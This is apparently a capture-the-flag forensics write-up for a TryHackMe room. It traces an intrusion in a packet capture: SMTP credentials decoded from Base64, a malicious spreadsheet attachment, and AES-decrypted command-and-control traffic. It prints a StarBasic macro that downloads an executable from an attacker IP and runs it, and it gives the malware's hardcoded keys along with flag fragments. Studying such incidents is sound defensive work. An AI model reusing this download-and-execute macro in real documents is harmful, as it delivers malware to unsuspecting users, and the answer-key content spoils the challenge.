# [Pressed](https://tryhackme.com/room/pressedroom)

## A full-scale intrusion was recently detected within the network, raising critical alarms.

A full-scale intrusion was recently detected within the network, raising critical alarms. Fortunately, a packet capture (PCAP) was recorded during the incident, capturing the attacker's initial entry and subsequent actions.

Your task is to analyse the traffic, identify how the attacker gained access, and uncover the sequence of malicious activity. Reconstruct the attack timeline and determine the final impact by finding the attacker's objective hidden within the captured data.

The flag is base64 encoded and divided into three parts.

### What is the first part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.

1. Looking through the capture, filter on SMTP traffic to find the mail authentication exchange. Between packets **2886-2891** we can see an `AUTH LOGIN` sequence, where the client authenticates to the mail server using Base64-encoded credentials:

```
smtp contains "AUTH LOGIN"
```

[SCREEN01]

Decoding the two Base64 strings captured in this exchange reveals the username `hazel@pressed.thm` and the password `password`. This is how the attacker authenticated to the SMTP server before sending the malicious email.

2. Right-click packet **2886** and choose **Follow -> TCP Stream**. Scrolling through the stream, we find a MIME attachment named `sheet.ods`. OpenDocument Spreadsheet file being sent as an email attachment. This is the delivery mechanism for the initial payload.

3. Copy out the Base64-encoded body of the attachment from the stream and decode it locally to reconstruct the original file:

```bash
base64 -d attachment > sheet.ods
```

4. `.ods` files are just ZIP archives, so the file can be extracted like any other archive. Inside the archive, under `Basic/Standard/`, there is a macro module named `evil.xml`. This file contains an embedded **StarBasic macro** that runs automatically and is responsible for the initial foothold:

```xml
<script:module script:name="evil" script:language="StarBasic" script:moduleType="normal">
  Sub Main
    Shell("cmd /c curl 10.13.44.207/client.exe -o C:\ProgramData\client.exe")
    Shell("cmd /c echo VEhNe0FfQzJfTUF5Xw==")
    Shell("C:\\ProgramData\\client.exe")
  End Sub
</script:module>
```

The macro performs three actions when executed:

- Downloads a second-stage binary from the attacker's server at `10.13.44.207` and saves it to `C:\ProgramData\client.exe`.
- Echoes out a Base64 string. This is the **first part of the flag**.
- Executes the downloaded binary, establishing the attacker's foothold on the victim host.

---

### What is the second part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.

1. Now that we know the macro downloads `client.exe` over HTTP, filter the capture for that request. The download occurs in packet **2962**:

```
http.request.uri contains "client.exe"
```

2. Right-click the packet and choose **Follow -> TCP Stream**, then switch the stream view from **ASCII** to **Raw** so the executable isn't corrupted by encoding conversion. Save the raw stream contents to disk as `client.exe`.

3. Open the saved file in a hex/text editor such as `vim` and remove the leftover HTTP response headers from the top of the file. Roughly the first ~10 lines so that only the raw PE executable remains.

[SCREEN02]

4. Load the cleaned-up `client.exe` into **Binary Ninja** for static analysis. In the `main` function, several suspicious string constants stand out, including the string `rhI1YazJLaLVgWv4`. Clicking through the cross-references leads to the following hardcoded values used for encrypting/decrypting C2 traffic:

```
key1: rhI1YazJLaLVgWv4
key2: VKf7EQIvl8ps6MJj
vi:   pEw8P3PU9kCcG4sj
```

[SCREEN03]

These two 16-byte keys are concatenated to form a single 32-byte AES-256 key, and the third value is used as the initialization vector for AES-CBC.

5. Further analysis of the binary's networking functions shows that the malware establishes its command-and-control channel over TCP port 443.

[SCREEN04]

6. Back in Wireshark, filter on the C2 port and inspect the traffic between the victim and the attacker's server:

```
tcp.port == 443
```

Packet **6731** contains one such encrypted payload. Copy the hex value of the TCP payload: `1220b16630b84067c78ffb13915e8735bdb43608954e45203bccc5d8f72c7e4707dced8ae4cb01cfd078bc0051b56a196d85a59bff6d4974325c73b5692827ab`

[SCREEN05]

7. Decrypt this payload using **AES-CBC**, with the key formed by concatenating `key1` and `key2` from Binary Ninja and the IV `pEw8P3PU9kCcG4sj`. This can be done by pasting the hex payload into [CyberChef](https://gchq.github.io/CyberChef/) and building an **AES Decrypt** recipe.

[SCREEN06]

Decrypting this traffic reveals the **second part of the flag**, embedded inside one of the attacker's C2 commands.

---

### What is the third part of the encoded flag value? Format: Paste the encoded value. Not the decoded value.

1. The final flag fragment is transmitted later in the same encrypted C2 channel. Locate packet **6744**, follow the same process as before: copy the raw TCP payload and decrypt it using the same AES key/IV combination in [CyberChef](https://gchq.github.io/CyberChef/).

[SCREEN07]

This reveals the **third and final part of the flag**.

---

### What is the flag? Format: Paste the decoded values.

1. Concatenate all three Base64 fragments recovered above, in order, into a single string, then decode the combined string using [CyberChef](https://gchq.github.io/CyberChef/) From Base64 recipe to recover the final flag.

[SCREEN08]
